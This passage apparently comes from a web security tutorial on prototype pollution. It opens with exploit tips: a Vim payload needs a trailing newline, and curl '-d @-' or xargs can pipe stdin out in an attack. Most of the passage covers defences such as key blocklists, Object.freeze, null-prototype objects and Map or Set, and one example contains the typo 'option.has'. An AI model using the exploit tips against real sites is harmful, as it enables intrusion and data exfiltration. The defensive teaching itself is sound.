Vim has an interactive prompt and expects the user to hit `Enter` to run the provided command. As a result, you need to simulate this by including a newline (`\n`) character at the end of your payload, as shown in the example above.

One additional limitation of this technique is that some tools that you might want to use for your exploit also don't read data from `stdin` by default. However, there are a few simple ways around this. In the case of `curl`, for example, you can read `stdin` and send the contents as the body of a `POST` request using the `-d @-` argument.

In other cases, you can use `xargs`, which converts `stdin` to a list of arguments that can be passed to a command.

## Preventing prototype pollution vulnerabilities

We recommend patching any prototype pollution vulnerabilities you identify in your websites, regardless of whether these are coupled with exploitable gadgets. Even if you're confident that you haven't missed any, there's no guarantee that future updates to your own code or any libraries you use won't introduce new gadgets, paving the way for viable exploits.

In this section, we'll provide some high-level advice on some of the measures you can take to protect your own websites from the threats we've covered in our labs. We'll also cover some common pitfalls to avoid.

## Sanitizing property keys

One of the more obvious ways to prevent prototype pollution vulnerabilities is to sanitize property keys before merging them into existing objects. This way, you can prevent an attacker from injecting keys such as `__proto__`, which reference the object's prototype.

Using an allowlist of permitted keys is the most effective way to do this. However, as this is not feasible in many cases, it's common to use a blocklist instead, removing any potentially dangerous strings from user input.

Although this is a quick fix to implement, truly robust blocklisting is inherently tricky, as demonstrated by sites that successfully block `__proto__`, but fail to account for an attacker polluting an object's prototype via its constructor. Likewise, weak implementations can also be bypassed using simple obfuscation techniques. For this reason, we only recommend this as a stopgap rather than a long-term solution.

## Preventing changes to prototype objects

A more robust approach to preventing prototype pollution vulnerabilities is to prevent prototype objects from being changed at all.

Invoking the `Object.freeze()` method on an object ensures that its properties and their values can no longer be modified, and no new properties can be added. As prototypes are just objects themselves, you can use this method to proactively cut off any potential sources:

`Object.freeze(Object.prototype);`

The `Object.seal()` method is similar, but still allows changes to the values of existing properties. This may be a good compromise if you're unable to use `Object.freeze()` for any reason.

## Preventing an object from inheriting properties

While you can use `Object.freeze()` to block potential prototype pollution sources, you can also take measures to eliminate gadgets. This way, even if an attacker identifies a prototype pollution vulnerability, it is likely to be unexploitable.

By default, all objects inherit from the global `Object.prototype` either directly or indirectly via the prototype chain. However, you can also manually set an object's prototype by creating it using the `Object.create()` method. Not only does this let you assign any object you like as the new object's prototype, you can also create the object with a `null` prototype, which ensures that it won't inherit any properties at all.

```js
let myObject = Object.create(null);
Object.getPrototypeOf(myObject);    // null
```
## Using safer alternatives where possible

Another robust defense against prototype pollution is to use objects that provide built-in protection. For example, when defining an options object, you could use a `Map` instead. Although a map can still inherit malicious properties, they have a built-in `get()` method that only returns properties that are defined directly on the map itself:

```js
Object.prototype.evil = 'polluted';
let options = new Map();
options.set('transport_url', 'https://normal-website.com');

options.evil;                    // 'polluted'
options.get('evil');             // undefined
options.get('transport_url');    // 'https://normal-website.com'
```
A `Set` is another alternative if you're just storing values rather than `key:value` pairs. Just like maps, sets provide built-in methods that only return properties that were defined directly on the object itself:

```js
Object.prototype.evil = 'polluted';
let options = new Set();
options.add('safe');

options.evil;           // 'polluted';
option.has('evil');     // false
options.has('safe');    // true
```
